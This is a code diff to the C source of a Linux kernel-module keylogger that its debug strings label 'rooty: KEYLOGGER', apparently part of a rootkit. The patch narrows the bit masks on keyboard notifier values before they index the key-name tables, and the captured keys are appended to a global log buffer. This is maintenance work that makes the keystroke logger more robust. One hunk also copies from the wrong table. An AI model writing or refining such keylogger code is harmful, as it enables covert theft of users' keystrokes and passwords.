@@ -18,7 +18,7 @@ char logbuf[LOGSIZE];
 
 static void ksym_std ( struct keyboard_notifier_param *param, char *buf )
 {
-    unsigned char val = param->value & 0xff;
+    unsigned char val = param->value & 0x7f;
     unsigned long len;
 
     //printk("rooty: KEYLOGGER: ksym_std: %s\n", ascii[val]);
@@ -51,7 +51,7 @@ static void ksym_fnc ( struct keyboard_notifier_param *param, char *buf )
 static void ksym_loc ( struct keyboard_notifier_param *param, char *buf )
 {
     unsigned long len;
-    unsigned char val = param->value & 0xff;
+    unsigned char val = param->value & 0x0f;
     //printk("rooty: KEYLOGGER: ksym_loc: %s\n",locpad[val]);
     len = strlcpy(&logbuf[logidx], locpad[val], LOGSIZE - logidx);
 
@@ -61,7 +61,7 @@ static void ksym_loc ( struct keyboard_notifier_param *param, char *buf )
 static void ksym_num ( struct keyboard_notifier_param *param, char *buf )
 {
     unsigned long len;
-    unsigned char val = param->value & 0xff;
+    unsigned char val = param->value & 0x0f;
     //printk("rooty: KEYLOGGER: ksym_num: %s\n",numpad[val]);
     len = strlcpy(&logbuf[logidx], numpad[val], LOGSIZE - logidx);
 
@@ -71,7 +71,7 @@ static void ksym_num ( struct keyboard_notifier_param *param, char *buf )
 static void ksym_arw ( struct keyboard_notifier_param *param, char *buf )
 {
     unsigned long len;
-    unsigned char val = param->value & 0xff;
+    unsigned char val = param->value & 0x0f;
     //printk("rooty: KEYLOGGER: ksym_arw: %s\n",arrows[val]);
     len = strlcpy(&logbuf[logidx], arrows[val], LOGSIZE - logidx);
     logidx += len;
@@ -80,7 +80,7 @@ static void ksym_arw ( struct keyboard_notifier_param *param, char *buf )
 static void ksym_mod ( struct keyboard_notifier_param *param, char *buf )
 {
     unsigned long len;
-    unsigned char val = param->value & 0xff;
+    unsigned char val = param->value & 0x0f;
     //printk("rooty: KEYLOGGER: ksym_mod: %s\n",mod[val]);
     len = strlcpy(&logbuf[logidx], arrows[val], LOGSIZE - logidx);
     logidx += len;
